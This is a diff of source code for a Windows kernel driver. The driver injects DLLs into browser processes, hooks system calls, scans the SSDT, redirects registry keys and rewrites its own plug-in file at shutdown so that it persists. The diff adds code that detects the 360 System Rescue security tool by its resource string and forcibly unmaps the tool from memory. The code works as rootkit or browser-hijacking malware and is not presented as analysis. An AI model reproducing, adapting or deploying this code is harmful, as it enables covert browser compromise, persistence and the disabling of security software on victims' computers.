@@ -1484,8 +1550,7 @@ NTSTATUS NTAPI NewNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, P
                 *pPrevMode = prevMode;
             }
         }
-    } else
-        status = STATUS_NOT_FOUND;
+    } else status = STATUS_NOT_FOUND;
 
     return status;
 }
@@ -1515,8 +1580,7 @@ NTSTATUS NTAPI NewNtProtectVirtualMemory(IN HANDLE ProcessHandle, IN PVOID *Base
                 *pPrevMode = prevMode;
             }
         }
-    } else
-        status = STATUS_NOT_FOUND;
+    } else status = STATUS_NOT_FOUND;
 
     return status;
 }
@@ -1531,21 +1595,18 @@ BOOLEAN IsX64Module(IN PVOID pBase)
     ULONG_PTR pAddress = 0;
     ASSERT(pBase != NULL);
 
-    if (pBase == NULL)
-        return FALSE;
+    if (pBase == NULL) return FALSE;
 
-    // Not a PE file
-    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
-        return FALSE;
+    /// Not a PE file
+    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
 
     pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
     pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);
 
-    //Not a PE file
-    if (pNtHdr32->Signature != IMAGE_NT_SIGNATURE)
-        return FALSE;
+    // Not a PE file
+    if (pNtHdr32->Signature != IMAGE_NT_SIGNATURE) return FALSE;
 
-    //64 bit image
+    // 64 bit image
     if (pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
         return TRUE;
     }
@@ -1567,19 +1628,16 @@ PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
     ULONG i = 0;
     ASSERT(pBase != NULL);
 
-    if (pBase == NULL)
-        return NULL;
+    if (pBase == NULL) return NULL;
 
     /// Not a PE file
-    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
-        return NULL;
+    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
 
     pNtHdr32 = (PIMAGE_NT_HEADERS32)((PUCHAR)pBase + pDosHdr->e_lfanew);
     pNtHdr64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBase + pDosHdr->e_lfanew);
 
     // Not a PE file
-    if (pNtHdr32->Signature != IMAGE_NT_SIGNATURE)
-        return NULL;
+    if (pNtHdr32->Signature != IMAGE_NT_SIGNATURE) return NULL;
 
     // 64 bit image
     if (pNtHdr32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
@@ -1610,14 +1668,15 @@ PVOID GetProcAddress(IN PVOID pBase, IN PCCHAR name_ord)
             OrdIndex = pAddressOfOrds[i];
         }
         // Weird params
-        else
-            return NULL;
+        else return NULL;
+
         if (((ULONG_PTR)name_ord <= 0xFFFF && (USHORT)((ULONG_PTR)name_ord) == OrdIndex + pExport->Base) ||
             ((ULONG_PTR)name_ord > 0xFFFF && strcmp(pName, name_ord) == 0)) {
             pAddress = pAddressOfFuncs[OrdIndex] + (ULONG_PTR)pBase;
             break;
         }
     }
+
     return (PVOID)pAddress;
 }
 
@@ -1654,13 +1713,48 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
         InitGlobeFunc(ImageInfo);
         _wcslwr(pTempBuf);
         ProcessObj = PsGetCurrentProcess();
-
         if (g_offset_name == 0) {
             g_offset_name = GetNameOffset(ProcessObj);
         }
 
+
+        if (TRUE) {
 #ifdef _AMD64_
+            PPEB64  peb64 = (PPEB64)PsGetProcessPeb(ProcessObj);
+
+#else
+            PPEB32  peb64 = (PPEB32)PsGetProcessPeb(ProcessObj);
+#endif
+
+            if(peb64 && peb64->ImageBaseAddress) {
+
+                BOOLEAN bX641 = IsX64Module((PVOID)peb64->ImageBaseAddress);
+                BOOLEAN bX642 = IsX64Module((PVOID)ImageInfo->ImageBase);
+                if(bX641 == bX642) {
+                    BOOLEAN bDeny = IsDenyProcess((PVOID)peb64->ImageBaseAddress, bX641);
+                    if(bDeny) {
+                        HANDLE hThread = NULL;
+                        PMY_DATA pMyData = (PMY_DATA)ExAllocatePool(NonPagedPool, sizeof(MY_DATA));
+                        pMyData->ProcessId = ProcessId;
+                        pMyData->pImageBase = (PVOID)peb64->ImageBaseAddress;
+                        PsCreateSystemThread(&hThread, 0, NULL, NtCurrentProcess(), NULL, DenyThread, pMyData);
+                        goto fun_ret;
+
+
+                    }
+                }
+            }
+
+
+        }
+
+
+
+#ifdef _AMD64_
+
         //x64 add code
+
+
         pPEB = PsGetProcessWow64Process(ProcessObj);
         if (wcsstr(pTempBuf, L"\\syswow64\\") != NULL) {
             bGet = GetNameByObj(ProcessObj, exename);
@@ -1676,7 +1770,6 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
                         if (pchrome == NULL && pFirefox == NULL) {
                             LOG(LOGFL_INFO, ("[ImageNotify] pid:%d x86 inject %ws CommandLine:%ws", ProcessId, exename, CommandLine));
                             InjectDll(ProcessObj, 32);
-
                         }
                     }
 
@@ -1702,15 +1795,15 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
                 }
             }
         }
+
+
 #else
         //x86 add code
 
         pPEB = PsGetProcessPeb(ProcessObj);
         bGet = GetNameByObj(ProcessObj, exename);
-        LOG(LOGFL_INFO, ("[ImageNotify] pid:%d x86 inject %ws", ProcessId, exename));
         bFindExe = FindInBrowser(exename);
         if (bFindExe) {
-
             BOOLEAN bGetCommand = FALSE;
             bGetCommand = GetCommandLine(ProcessObj, CommandLine);
             if (bGetCommand) {
@@ -1731,9 +1824,6 @@ fun_ret:
     return;
 }
 
-
-
-
 ULONGLONG GetKeServiceDescriptorTable64()
 {
     char KiSystemServiceStart_pattern[14] = "\x8B\xF8\xC1\xEF\x07\x83\xE7\x20\x25\xFF\x0F\x00\x00"; //
@@ -1747,8 +1837,7 @@ ULONGLONG GetKeServiceDescriptorTable64()
             for (b = 0; b < 50; b++) {
                 tbl_address = ((ULONGLONG)CodeScanStart + i + b);
 
-                if (*(USHORT *)((ULONGLONG)tbl_address) == (USHORT)0x8d4c)
-                    return ((LONGLONG)tbl_address + 7) + *(LONG *)(tbl_address + 3);
+                if (*(USHORT *)((ULONGLONG)tbl_address) == (USHORT)0x8d4c) return ((LONGLONG)tbl_address + 7) + *(LONG *)(tbl_address + 3);
             }
         }
     }
@@ -1762,10 +1851,8 @@ ULONG_PTR GetSSDTFuncCurAddr(LONG id)
     LONG dwtmp = 0;
     PULONG ServiceTableBase = NULL;
 
-    if (KeServiceDescriptorTable == NULL)
-        return NULL;
-    if (KeServiceDescriptorTable->NumberOfService < id)
-        return NULL;
+    if (KeServiceDescriptorTable == NULL) return NULL;
+    if (KeServiceDescriptorTable->NumberOfService < id) return NULL;
     ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
     dwtmp = ServiceTableBase[id];
     dwtmp = dwtmp >> 4;
@@ -1775,6 +1862,7 @@ ULONG_PTR GetSSDTFuncCurAddr(LONG id)
     return p;
 #endif
 }
+
 
 /**
  * [InjectDll description]
@@ -1904,7 +1992,6 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
                 }
             }
 
-
         } else   if (ibit == 64 && fnHookfunc64) {
             int lencode =  GetPatchSize((PUCHAR)pOldCode64, 12);
             if (lencode) {
@@ -1954,32 +2041,17 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
     }
 }
 
-NTSTATUS AppendListNode(CONST WCHAR name[], LIST_ENTRY *link, ULONG uType)
-{
-    PMY_COMMAND_INFO pInfo = (PMY_COMMAND_INFO)kmalloc(sizeof(MY_COMMAND_INFO));
-    if (NULL == pInfo) {
-        return STATUS_INSUFFICIENT_RESOURCES;
-    }
-    RtlZeroMemory(pInfo, sizeof(MY_COMMAND_INFO));
-    pInfo->uType = uType;
-    wcscpy(pInfo->exename, name);
-    InsertHeadList(link, (PLIST_ENTRY)&pInfo->Entry);
-
-    return STATUS_SUCCESS;
-}
-
-
 
 NTSTATUS MzReadFile(LPWCH pFile, PVOID *ImageBaseAddress, PULONG ImageSize)
 {
     HANDLE hDestFile = NULL;
     ULONG ret = 0;
     OBJECT_ATTRIBUTES obj_attrib;
-    IO_STATUS_BLOCK Io_Status_Block = {0};
+    IO_STATUS_BLOCK Io_Status_Block = { 0 };
     NTSTATUS status = 0;
-    LARGE_INTEGER offset = {0};
+    LARGE_INTEGER offset = { 0 };
     ULONG length = 0;
-    UNICODE_STRING ustrSrcFile = {0};
+    UNICODE_STRING ustrSrcFile = { 0 };
     PVOID pdata1 = NULL;
     RtlInitUnicodeString(&ustrSrcFile, pFile);
     InitializeObjectAttributes(&obj_attrib, &ustrSrcFile, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
@@ -2013,11 +2085,10 @@ NTSTATUS MzReadFile(LPWCH pFile, PVOID *ImageBaseAddress, PULONG ImageSize)
 ULONG MzGetFileSize(HANDLE hfile)
 {
     NTSTATUS ntStatus = 0;
-    IO_STATUS_BLOCK iostatus = {0};
-    FILE_STANDARD_INFORMATION fsi = {0};
+    IO_STATUS_BLOCK iostatus = { 0 };
+    FILE_STANDARD_INFORMATION fsi = { 0 };
     ntStatus = ZwQueryInformationFile(hfile, &iostatus, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
-    if (!NT_SUCCESS(ntStatus))
-        return 0;
+    if (!NT_SUCCESS(ntStatus)) return 0;
     return fsi.EndOfFile.QuadPart;
 }
 
@@ -2136,57 +2207,9 @@ void InitGlobeFunc(PIMAGE_INFO ImageInfo)
         }
     }
 }
-PMY_COMMAND_INFO FindInList(const WCHAR *name, LIST_ENTRY *link, PKSPIN_LOCK lock)
-{
-    PLIST_ENTRY p;
-    BOOLEAN bret = FALSE;
-    PMY_COMMAND_INFO pData = NULL;
-    KIRQL irql; // 中断级别
-    KeAcquireSpinLock(lock, &irql);
-    for (p = link->Flink; p != &link->Flink; p = p->Flink) {
-        PMY_COMMAND_INFO pData1 = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
-        if (_wcsicmp(pData1->exename, name) == 0) {
-            pData = pData1;
-            break;
-        }
-    }
-    KeReleaseSpinLock(lock, irql);
-    return pData;
-}
 
 
 
-
-BOOLEAN  FindInBrowser(const WCHAR *name)
-{
-    BOOLEAN  bRet = FALSE;
-    ULONG i = 0;
-
-    for(i = 0; i < g_iBrowser; i++) {
-
-        if(_wcsicmp(g_HexBrowser[i], name) == 0) {
-            bRet = TRUE;
-            break;
-        }
-    }
-    return bRet;
-}
-
-
-
-PMY_COMMAND_INFO  FindInProtectFile(const WCHAR *name)
-{
-    PMY_COMMAND_INFO pInfo = NULL;
-    ULONG i = 0;
-    for (i = 0; i < 2; i++) {
-
-        if (_wcsicmp(g_pProtectFile[i].exename, name) == 0) {
-            pInfo = &g_pProtectFile[i];
-            break;
-        }
-    }
-    return pInfo;
-}
 
 
 
@@ -2218,29 +2241,22 @@ VOID ReadDriverParameters(IN PUNICODE_STRING RegistryPath)
 
         //
         //  Open the desired registry key
-        //
+
         InitializeObjectAttributes(&attributes, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
         status = ZwOpenKey(&driverRegKey, KEY_READ, &attributes);
         if (!NT_SUCCESS(status)) {
 
             return;
         }
-
-        //
         // Read the given value from the registry.
-        //
-
         RtlInitUnicodeString(&valueName, L"DebugFlags");
         status = ZwQueryValueKey(driverRegKey, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &resultLength);
         if (NT_SUCCESS(status)) {
-
             LoggingFlags = *((PULONG) & (((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
         }
-
         //
         //  Close the registry entry
         //
-
         ZwClose(driverRegKey);
     }
 }
@@ -2251,9 +2267,9 @@ NTSTATUS DispatchShutDown(IN PDEVICE_OBJECT Device, IN PIRP Irp)
     //HANDLE hkey;
     //PKLDR_DATA_TABLE_ENTRY entry=(PKLDR_DATA_TABLE_ENTRY)pDriver_entry->DriverSection;
     //MzWriteFile(strSys,puiprotect,iuiprotect);  //
-    status = bAceessFile(g_pPlugPath);
+    status = bAceessFile(g_HexConfig[12]);
     if (status == STATUS_OBJECT_NAME_NOT_FOUND) {
-        status = MzWriteFile(g_pPlugPath, g_pPlugBuffer, g_iPlugSize);
+        status = MzWriteFile(g_HexConfig[12], g_pPlugBuffer, g_iPlugSize);
     }
 
     return STATUS_SUCCESS;
@@ -2263,9 +2279,9 @@ NTSTATUS MzWriteFile(LPWCH pFile, PVOID pData, ULONG len)
 {
     HANDLE hDestFile;
     OBJECT_ATTRIBUTES obj_attrib;
-    IO_STATUS_BLOCK Io_Status_Block = {0};
+    IO_STATUS_BLOCK Io_Status_Block = { 0 };
     NTSTATUS status = STATUS_UNSUCCESSFUL;
-    LARGE_INTEGER offset = {0};
+    LARGE_INTEGER offset = { 0 };
     ULONG length = len;
     ULONG uret = 0;
     UNICODE_STRING ustrSrcFile;
@@ -2297,8 +2313,7 @@ NTSTATUS MzWriteFile(LPWCH pFile, PVOID pData, ULONG len)
     uret = Io_Status_Block.Information;
 
 fun_ret:
-    if (hDestFile)
-        ZwClose(hDestFile);
+    if (hDestFile) ZwClose(hDestFile);
     return status;
 }
 
@@ -2329,58 +2344,67 @@ NTSTATUS bAceessFile(PCWSTR FileName)
     return ntStatus;
 }
 
-NTSTATUS LfGetObjectName(IN CONST PVOID Object, OUT PUNICODE_STRING *ObjectName)
+NTSTATUS LfGetObjectName(IN CONST PVOID Object, OUT PUNICODE_STRING *ObjectName, PUNICODE_STRING pPartialName)
 {
-    NTSTATUS Status = STATUS_INSUFFICIENT_RESOURCES;
+    NTSTATUS        Status = STATUS_INSUFFICIENT_RESOURCES;
     PUNICODE_STRING TmpName;
-    ULONG ReturnLength;
+    ULONG           ReturnLength;
+    ULONG           MaxLen = 0;
+    if ((!MmIsAddressValid(Object)) || (ObjectName == NULL)) return Status;
 
+    if (pPartialName->Length > 512 || pPartialName->Length == 0) return Status;
+
+    if (pPartialName->Buffer[0] == L'\\') {
+        return STATUS_SUCCESS;
+    }
     ObQueryNameString(Object, (POBJECT_NAME_INFORMATION)&ReturnLength, sizeof(ULONG), &ReturnLength);
     *ObjectName = NULL;
-    TmpName = (PUNICODE_STRING)kmalloc(ReturnLength);
+    MaxLen = ReturnLength + pPartialName->MaximumLength + 4;
+    if (ReturnLength > 512) return Status;
+    TmpName = (PUNICODE_STRING)kmalloc(MaxLen);
     if (TmpName) {
         Status = ObQueryNameString(Object, (POBJECT_NAME_INFORMATION)TmpName, ReturnLength, &ReturnLength);
         if (NT_SUCCESS(Status)) {
+            TmpName->MaximumLength = TmpName->MaximumLength + pPartialName->MaximumLength + 2;
+            RtlAppendUnicodeToString(TmpName, L"\\");
+            RtlAppendUnicodeToString(TmpName, pPartialName->Buffer);
             *ObjectName = TmpName;
         } else {
             kfree(TmpName);
         }
+
     }
+
 
     return Status;
 }
 
-
-
-void EncodeBuffer(PVOID  SwappedBuffer, PUCHAR origBuf, ULONG Len, BOOLEAN bEncrypte)
+void EncodeBuffer(PVOID    SwappedBuffer, PUCHAR origBuf, ULONG Len, BOOLEAN bEncrypte)
 {
     try {
-        if (MmIsAddressValid(SwappedBuffer)) {
-            if (bEncrypte) {
-                ULONG i = 0;
-                for (i = 0; i < Len; i++) {
-                    PUCHAR pByte = (PUCHAR)SwappedBuffer;
-                    origBuf[i] = pByte[i] ^ 0xa;
-                }
 
-            } else {
+        if (bEncrypte) {
+            if(Len > sizeof(IMAGE_NT_HEADERS)) {
 
                 RtlCopyMemory(origBuf, SwappedBuffer, Len);
+                memset(origBuf, 0x90, sizeof(IMAGE_NT_HEADERS));
             }
 
+
+        } else {
+
+            RtlCopyMemory(origBuf, SwappedBuffer, Len);
         }
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {
         ULONG code = GetExceptionCode();
     }
 }
-
-
 //L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files"
 NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo, long NotifyClass, WCHAR path[])
 {
     NTSTATUS status = STATUS_SUCCESS;
-    UNICODE_STRING FullKeyName = {0};
+    UNICODE_STRING FullKeyName = { 0 };
     HANDLE KeyHandle;
     ULONG Disposition;
     OBJECT_ATTRIBUTES ObjectAttrib;
@@ -2396,13 +2420,15 @@ NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo, long NotifyClass, WCHA
         status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
         if (NT_SUCCESS(status)) {
             __try {
+
                 if (NotifyClass == RegNtPreCreateKeyEx) {
                     *KeyInfo->Disposition = Disposition;
                 }
+
                 *KeyInfo->ResultObject = KeyObject;
                 KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
                 status = STATUS_CALLBACK_BYPASS;
-            } __except (EXCEPTION_EXECUTE_HANDLER) {
+            } __except(EXCEPTION_EXECUTE_HANDLER) {
                 ObDereferenceObject(KeyObject);
                 status = GetExceptionCode();
             }
@@ -2410,7 +2436,6 @@ NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo, long NotifyClass, WCHA
 
         ZwClose(KeyHandle);
     }
-
     return status;
 }
 
@@ -2433,10 +2458,14 @@ void InitAllStr()
             status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
             wcscpy(g_HexBrowser[g_iBrowser], UnicodeString2.Buffer);
             g_iBrowser += 1;
+            RtlFreeUnicodeString(&UnicodeString2);
             //kprintf("g_iBrowser:%d name:%s", g_iBrowser, pRetBuff);
         }
     }
     MyDecryptFile(hexConfig, sizeof(hexConfig), 0xb);
+//  [DriverEntry] File:\??\C:\Windows\adcore32.dat Error status:c0000034
+//    MzWriteFile(L"\\??\\C:\\hex.txt", hexConfig, sizeof(hexConfig));
+
     if (TRUE) {
         CHAR *pnext = (CHAR *)hexConfig;
         CHAR *pRetBuff = NULL;
@@ -2458,6 +2487,36 @@ void InitAllStr()
     }
 }
 
+
+
+BOOLEAN  FindInBrowser(const WCHAR *name)
+{
+    BOOLEAN  bRet = FALSE;
+    ULONG i = 0;
+    for (i = 0; i < g_iBrowser; i++) {
+
+        if (_wcsicmp(g_HexBrowser[i], name) == 0) {
+            bRet = TRUE;
+            break;
+        }
+    }
+    return bRet;
+}
+
+
+PMY_COMMAND_INFO  FindInProtectFile(const WCHAR *name)
+{
+    PMY_COMMAND_INFO pInfo = NULL;
+    ULONG i = 0;
+    for (i = 0; i < 2; i++) {
+
+        if (_wcsicmp(g_pProtectFile[i].exename, name) == 0) {
+            pInfo = &g_pProtectFile[i];
+            break;
+        }
+    }
+    return pInfo;
+}
 
 
 ULONG GetPatchSize(PUCHAR Address, int asmlen)
@@ -2487,15 +2546,13 @@ void LDE_init()
 }
 
 
-
-
 ULONG GetAsmSize(PUCHAR Address, int asmlen)
 {
     ULONG   dw;
     Disasm  dis;
     ULONG   DecodedLength = 0;
     int lencode = 0;
-    while(DecodedLength < asmlen) {
+    while (DecodedLength < asmlen) {
         int  dw = DisasmCode((PUCHAR)((PUCHAR)Address + DecodedLength), asmlen, &dis);
         DecodedLength = DecodedLength + dw;
     }
@@ -2523,12 +2580,12 @@ BOOLEAN isContained(const char *str, char c)
 
 
 //*save_ptr等价于以前的静态指针
-char *myStrtok_r(char* string_org, const char* demial, char **save_ptr)
+char* myStrtok_r(char *string_org, const char *demial, char **save_ptr)
 {
     char *str = NULL;         //返回的字符串
     const char *ctrl = demial; //分隔符
     //将分隔符放入map中
-    char map[255] = {0};
+    char map[255] = { 0 };
     size_t len = 0;
 
     if (demial == NULL) {
@@ -2557,7 +2614,7 @@ char *myStrtok_r(char* string_org, const char* demial, char **save_ptr)
 
 
     //忽略掉字符串中起始部分的分隔符,找到第一个不是分隔符的字符指针
-    while(*str != '\0') {
+    while (*str != '\0') {
         if (isContained(map, *str)) {
             str++;
             continue;
@@ -2587,7 +2644,260 @@ char *myStrtok_r(char* string_org, const char* demial, char **save_ptr)
 
 
 
-//
+ULONG  GetNameOffset(PEPROCESS proobj)
+{
+    ULONG offsetName = 0;
+    PVOID ppeb =  PsGetProcessPeb(proobj);
+    if (ppeb) {
+
+        ULONG pianyi = 9;
+        ULONG i = 0;
+        ULONG j = 0;
+        for (i = 0; i < 0x500; i += 4) {
+            PUCHAR pAddr1 = (PUCHAR)proobj + i;
+            if (MmIsAddressValid(pAddr1)) {
+                ULONG_PTR  pPebVal = *(PULONG_PTR)pAddr1;
+                if (pPebVal == ppeb) {
+                    pianyi = i;
+                    break;
+                }
+            }
+        }
+
+        if (pianyi) {
+            for (j = 0; j < 0x100; j++) {
+                ULONG offset = pianyi + j;
+                PULONG_PTR pNameOffset = (PULONG_PTR)((PUCHAR)proobj + offset);
+                if (MmIsAddressValid(pNameOffset)) {
+                    ULONG_PTR pAddr2 = *pNameOffset;
+                    PUNICODE_STRING  pName = (PUNICODE_STRING)pAddr2;
+                    if (MmIsAddressValid(pName) && MmIsAddressValid(pName->Buffer)) {
+                        WCHAR *pPath = pName->Buffer;
+                        if (wcsstr(pPath, L".exe") != NULL) {
+                            LOG(LOGFL_INFO, ("[GetNameOffset] offset:%x pPath:%ws", offset, pPath));
+                            offsetName =  offset;
+                            break;
+                        }
+
+                    }
+                }
+            }
+
+
+        }
+    }
+
+    return offsetName;
+}
+
+BOOLEAN IsDenyProcess(PVOID m_lpBaseAddress, BOOLEAN bX64)
+{
+    //定位NT头
+    //资源表的rva
+    BOOLEAN bDeny = FALSE;
+    ULONG i = 0;
+    try {
+        PUCHAR pImageBase = (PUCHAR)m_lpBaseAddress;
+        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)m_lpBaseAddress;
+        if(*pImageBase != 0x4d && *(pImageBase + 1) != 0x5e) {
+            return FALSE;
+        }
+
+        if(bX64) {
+            PIMAGE_NT_HEADERS64  lpNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)m_lpBaseAddress + pDosHeader->e_lfanew);
+            ULONG nOffset = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
+            int nNumberOfSection = lpNtHeader->FileHeader.NumberOfSections;
+            PIMAGE_OPTIONAL_HEADER64  lpOptionalHeader = (PIMAGE_OPTIONAL_HEADER64)&lpNtHeader->OptionalHeader;
+            PIMAGE_SECTION_HEADER   lpSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)lpOptionalHeader +  lpNtHeader->FileHeader.SizeOfOptionalHeader);
+            ULONG dwVaRet = 0;
+            PIMAGE_RESOURCE_DIRECTORY  pResTable = (PIMAGE_RESOURCE_DIRECTORY)((ULONG_PTR)m_lpBaseAddress + nOffset);
+            PIMAGE_RESOURCE_DIRECTORY_ENTRY pEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PUCHAR)pResTable + sizeof(IMAGE_RESOURCE_DIRECTORY));
+            for(i = 0; i < (pResTable->NumberOfNamedEntries + pResTable->NumberOfIdEntries); i++) {
+                PIMAGE_RESOURCE_DIRECTORY_ENTRY   pEntry = pEntries + i;
+
+                if(pEntry->Id == 6) {
+                    bDeny = IsFindInRes_String(m_lpBaseAddress, lpNtHeader, pResTable, pEntry, 1, lpSectionHeader, nNumberOfSection);
+                    break;;
+                }
+            }
+        } else {
+            PIMAGE_NT_HEADERS32  lpNtHeader = (PIMAGE_NT_HEADERS32)((PUCHAR)m_lpBaseAddress + pDosHeader->e_lfanew);
+            ULONG nOffset = lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
+            int nNumberOfSection = lpNtHeader->FileHeader.NumberOfSections;
+            PIMAGE_OPTIONAL_HEADER32  lpOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)&lpNtHeader->OptionalHeader;
+            PIMAGE_SECTION_HEADER   lpSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)lpOptionalHeader +  lpNtHeader->FileHeader.SizeOfOptionalHeader);
+            PIMAGE_RESOURCE_DIRECTORY  pResTable = (PIMAGE_RESOURCE_DIRECTORY)((ULONG_PTR)m_lpBaseAddress + nOffset);
+            PIMAGE_RESOURCE_DIRECTORY_ENTRY pEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PUCHAR)pResTable + sizeof(IMAGE_RESOURCE_DIRECTORY));
+            for(i = 0; i < (pResTable->NumberOfNamedEntries + pResTable->NumberOfIdEntries); i++) {
+                PIMAGE_RESOURCE_DIRECTORY_ENTRY   pEntry = pEntries + i;
+
+                if(pEntry->Id == 6) {
+                    bDeny = IsFindInRes_String(m_lpBaseAddress, lpNtHeader, pResTable, pEntry, 1, lpSectionHeader, nNumberOfSection);
+                    break;
+                }
+            }
+        }
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {
+        dprintf("[IsDenyProcess] except!");
+    }
+    return bDeny;
+}
+
+BOOLEAN IsFindInRes_String(PVOID lpBaseAddress, PVOID pNtHeaders, PIMAGE_RESOURCE_DIRECTORY tableAddress,
+                           PIMAGE_RESOURCE_DIRECTORY_ENTRY pEntry,
+                           int depth, PIMAGE_SECTION_HEADER pSection, int nSection)
+{
+
+    BOOLEAN bRet = FALSE;
+    ULONG    i = 0;
+    //一级目录,时才有下面的名称
+
+    //再确定节点类型（目录还是叶子）
+    if(pEntry->DataIsDirectory) {
+        PIMAGE_RESOURCE_DIRECTORY pDir = (PIMAGE_RESOURCE_DIRECTORY)((PUCHAR)tableAddress + pEntry->OffsetToDirectory);
+        PIMAGE_RESOURCE_DIRECTORY_ENTRY pEntries = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)((PUCHAR)pDir + sizeof(IMAGE_RESOURCE_DIRECTORY));
+        if(pDir->NumberOfNamedEntries < 0 || pDir->NumberOfIdEntries < 0) {
+            return bRet;
+        }
+
+        for(i = 0; i < (pDir->NumberOfNamedEntries + pDir->NumberOfIdEntries); i++) {
+            //递归调用
+            BOOLEAN bFind = IsFindInRes_String(lpBaseAddress, pNtHeaders, tableAddress, pEntries + i, depth + 1, pSection, nSection);
+            if(bFind == TRUE) {
+                return bFind;
+            }
+        }
+    } else {
+        //叶子
+        PIMAGE_RESOURCE_DATA_ENTRY pDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((PUCHAR)tableAddress + pEntry->OffsetToData);
+        int nFaOffset = pDataEntry->OffsetToData;
+        int nsize = pDataEntry->Size > 20 ? 20 : pDataEntry->Size;
+        unsigned char* szBuf = (unsigned char*)lpBaseAddress + nFaOffset;
+        WCHAR  resStr[40] = {0};
+        memcpy(resStr, szBuf, nsize);
+        if(wcsstr(resStr, L"360系统急救箱") != NULL) {
+            bRet = TRUE;
+
+        }
+    }
+
+    return bRet;
+}
+
+
+
+
+
+VOID DenyThread(PVOID StartContext)
+{
+    PMY_DATA pMyData = (PMY_DATA)StartContext;
+    //LARGE_INTEGER liTime = { 0 };
+    //// 延时 1 秒
+    //liTime.QuadPart = -10 * 1000 * 1000;      // 100纳秒为单位时间, 1秒==1000毫秒==1000*1000微秒==1000*1000*1000纳秒, 负值表示相对时间
+    //KeDelayExecutionThread(KernelMode, FALSE, &liTime);
+    // 卸载
+    DenyLoadDll(pMyData->ProcessId, pMyData->pImageBase);
+    ExFreePool(pMyData);
+}
+
+
+
+// 调用 MmUnmapViewOfSection 函数来卸载已经加载的 DLL 模块
+NTSTATUS DenyLoadDll(HANDLE ProcessId, PVOID pImageBase)
+{
+    NTSTATUS status = STATUS_SUCCESS;
+    PEPROCESS pEProcess = NULL;
+    status = PsLookupProcessByProcessId(ProcessId, &pEProcess);
+    if(!NT_SUCCESS(status)) {
+        DbgPrint("[DenyLoadDll] PsLookupProcessByProcessId Error[0x%X]\n", status);
+        return status;
+    }
+
+    // 卸载模块
+    status = MmUnmapViewOfSection(pEProcess, pImageBase);
+    ObfDereferenceObject(pEProcess);
+
+    if(!NT_SUCCESS(status)) {
+        DbgPrint("[DenyLoadDll] MmUnmapViewOfSection Error[0x%X]\n", status);
+        return status;
+    }
+
+    return status;
+}
+
+
+
+
+NTSTATUS IrpFileWrite(PFILE_OBJECT pFileObject, PLARGE_INTEGER ByteOffset, ULONG aalen, PVOID Buffer, PIO_STATUS_BLOCK pIoStatusBlock)
+{
+
+    NTSTATUS status;
+    KEVENT event;
+    PIRP irp;
+    PIO_STACK_LOCATION irpSp;
+    PDEVICE_OBJECT deviceObject;
+    PDEVICE_OBJECT polddev = NULL;
+
+    //
+    if(pIoStatusBlock == NULL || pFileObject == NULL || aalen <= 0 || Buffer == NULL)return STATUS_INVALID_PARAMETER;
+
+
+    if(ByteOffset == NULL) {
+        if(!(pFileObject->Flags & FO_SYNCHRONOUS_IO))
+            return STATUS_INVALID_PARAMETER;
+
+        ByteOffset = &pFileObject->CurrentByteOffset;
+    }
+
+
+    deviceObject = IoGetRelatedDeviceObject(pFileObject);
+
+    if(deviceObject == NULL || deviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+
+
+    irp = IoAllocateIrp(deviceObject->StackSize, FALSE);
+
+    if(irp == NULL)return STATUS_INSUFFICIENT_RESOURCES;
+
+
+    irp->MdlAddress = IoAllocateMdl(Buffer, aalen, FALSE, FALSE, NULL);
+
+    if(irp->MdlAddress == NULL) {
+        IoFreeIrp(irp);
